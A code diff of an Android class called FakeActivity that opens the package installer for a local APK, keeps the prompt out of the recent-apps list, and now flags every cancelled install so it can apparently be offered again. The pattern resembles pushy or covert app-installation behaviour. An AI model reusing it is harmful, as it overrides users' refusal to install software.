@@ -40,7 +40,7 @@ public class FakeActivity extends Activity {
         Intent i = new Intent(Intent.ACTION_VIEW);
         File upgradeFile = new File(fullPath);
         i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
-        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
         i.putExtra(Intent.EXTRA_RETURN_RESULT, true);
         startActivityForResult(i, REQ_INSTALL);
@@ -51,19 +51,15 @@ public class FakeActivity extends Activity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         if (requestCode == REQ_INSTALL) {
             if (resultCode == Activity.RESULT_CANCELED) {
-                if (AppRuntime.CANCEL_COUNT < 1) {
-                    AppRuntime.CANCEL_COUNT++;
+                AppRuntime.CANCEL_COUNT++;
 
-                    if (Config.DEBUG) {
-                        Config.LOGD("[[FakeActivity::onActivityResult]] Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT);
+                if (Config.DEBUG) {
+                    Config.LOGD("[[FakeActivity::onActivityResult]] Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT);
 //                        Toast.makeText(FakeActivity.this, "Install Package cancel btn click, count = " + AppRuntime.CANCEL_COUNT, Toast.LENGTH_SHORT).show();
-                    }
-
-                    finish();
-                } else {
-                    SettingManager.getInstance().setCancelInstallReserve(true);
-                    finish();
                 }
+                AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(false);
+                SettingManager.getInstance().setCancelInstallReserve(true);
+                finish();
             }
         }
     }
